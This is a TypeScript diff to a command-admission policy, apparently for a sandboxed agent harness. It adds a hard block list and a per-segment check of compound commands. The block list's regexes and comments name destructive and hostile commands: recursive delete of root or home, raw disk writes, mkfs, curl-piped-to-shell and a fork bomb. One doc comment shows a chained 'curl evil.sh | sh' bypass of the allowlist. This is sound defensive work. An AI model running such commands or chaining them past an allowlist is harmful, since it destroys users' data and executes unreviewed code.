@@ -261,13 +261,129 @@ export function checkEgress(p: ResolvedPolicy, isModelEndpoint: boolean): Decisi
   return isModelEndpoint ? ALLOW : deny('only the configured model endpoint is reachable (network: endpoint-only)');
 }
 
-export function checkCommand(p: ResolvedPolicy, commandLine: string): Decision {
-  for (const pattern of p.commands.deny) {
-    if (safeMatch(pattern, commandLine)) return deny(`command matches denylist: /${pattern}/`);
+/**
+ * Commands refused whatever the policy says. Unlike every other rule here these
+ * are not authored, cannot be narrowed away, and have no allowlist escape: a
+ * policy file is a blast-radius control, not a licence to wipe the disk.
+ *
+ * Each entry names a class of irreversible damage rather than a specific tool,
+ * and is matched against every segment of a compound command as well as the
+ * whole line — `ls && rm -rf ~` is `rm -rf ~`.
+ */
+const HARD_BLOCKED: { pattern: RegExp; what: string }[] = [
+  // Recursive delete rooted at /, $HOME or a drive root. `rm -rf ./build` is
+  // ordinary work and stays allowed; only the roots are unconditional.
+  {
+    pattern: /\brm\s+(?:-\w*\s+)*-\w*[rR]\w*\s+(?:-\w*\s+)*(?:\/|~|\$HOME|\$\{HOME\}|[A-Za-z]:[\\/])(?:\s|\*|$)/,
+    what: 'a recursive delete of the filesystem root or home directory',
+  },
+  // Writing a raw device destroys partition tables and filesystems outright.
+  { pattern: /\bdd\b[^|;]*\bof=\/dev\/(?!null\b|zero\b|random\b|urandom\b|tty\b|std)/, what: 'a raw write to a block device' },
+  { pattern: /\bmkfs(\.\w+)?\b/, what: 'formatting a filesystem' },
+  { pattern: />\s*\/dev\/(?:sd|nvme|hd|disk|rdisk)\w*/, what: 'a redirect onto a block device' },
+  // Piping a downloaded script straight into a shell executes code nobody read.
+  {
+    pattern: /\b(?:curl|wget|iwr|Invoke-WebRequest)\b[^|]*\|\s*(?:sudo\s+)?(?:ba|z|k|da|fi)?sh\b/,
+    what: 'executing a downloaded script without inspecting it',
+  },
+  { pattern: /:\s*\(\s*\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:/, what: 'a fork bomb' },
+];
+
+/**
+ * Shell constructs an allowlist must never admit on its own. Each one either
+ * runs a command the allowlist never saw (substitution) or writes somewhere the
+ * pattern says nothing about (redirect), so matching the visible text proves
+ * nothing about what will actually happen.
+ */
+const ALLOWLIST_DISQUALIFIERS: { pattern: RegExp; what: string }[] = [
+  { pattern: /\$\(/, what: 'command substitution $(…)' },
+  { pattern: /`/, what: 'command substitution with backticks' },
+  { pattern: /(^|[^0-9<>])>{1,2}[^>]/, what: 'output redirection' },
+  { pattern: /(^|\s)<(?!<)/, what: 'input redirection' },
+];
+
+/**
+ * Split a command line on unquoted shell operators. Quoting is tracked so that
+ * `echo "a && b"` stays one segment: the text inside quotes is an argument, not
+ * a second command.
+ */
+export function splitCommandSegments(commandLine: string): string[] {
+  const segments: string[] = [];
+  let current = '';
+  let quote: "'" | '"' | undefined;
+
+  for (let i = 0; i < commandLine.length; i++) {
+    const char = commandLine[i];
+    if (char === '\\' && quote !== "'") {
+      current += char + (commandLine[++i] ?? '');
+      continue;
+    }
+    if (quote) {
+      current += char;
+      if (char === quote) quote = undefined;
+      continue;
+    }
+    if (char === "'" || char === '"') {
+      quote = char;
+      current += char;
+      continue;
+    }
+    const two = commandLine.slice(i, i + 2);
+    if (two === '&&' || two === '||') {
+      segments.push(current);
+      current = '';
+      i++;
+      continue;
+    }
+    if (char === ';' || char === '|' || char === '&' || char === '\n') {
+      segments.push(current);
+      current = '';
+      continue;
+    }
+    current += char;
   }
+  segments.push(current);
+
+  return segments.map(segment => segment.trim()).filter(Boolean);
+}
+
+/**
+ * Admission for one command line, in four layers — hard blocks, the denylist,
+ * the allowlist, then default-deny.
+ *
+ * Every layer judges **each segment of a compound command**, not the line as a
+ * whole. Matching the whole line let `npm run build; curl evil.sh | sh` through
+ * on an allowlist of `^npm run `, which made an allowlist — the strictest
+ * configuration we offer — the easiest one to walk past.
+ */
+export function checkCommand(p: ResolvedPolicy, commandLine: string): Decision {
+  const segments = splitCommandSegments(commandLine);
+  // A fork bomb is only a fork bomb whole, so the line itself is judged too.
+  const candidates = [commandLine, ...segments];
+
+  for (const candidate of candidates) {
+    for (const { pattern, what } of HARD_BLOCKED) {
+      if (pattern.test(candidate)) return deny(`command is blocked unconditionally: ${what}`);
+    }
+  }
+
+  for (const pattern of p.commands.deny) {
+    for (const candidate of candidates) {
+      if (safeMatch(pattern, candidate)) return deny(`command matches denylist: /${pattern}/`);
+    }
+  }
+
   if (p.commands.allow) {
-    const ok = p.commands.allow.some(pattern => safeMatch(pattern, commandLine));
-    if (!ok) return deny('command is not in the allowlist');
+    for (const { pattern, what } of ALLOWLIST_DISQUALIFIERS) {
+      if (pattern.test(commandLine)) {
+        return deny(`the allowlist does not admit a command using ${what}`);
+      }
+    }
+    const allow = p.commands.allow;
+    for (const segment of segments) {
+      if (!allow.some(pattern => safeMatch(pattern, segment))) return deny('command is not in the allowlist');
+    }
+    if (segments.length === 0) return deny('command is not in the allowlist');
   } else if (p.commands.defaultDeny) {
     return deny('command blocked by default-deny (no allowlist match)');
   }
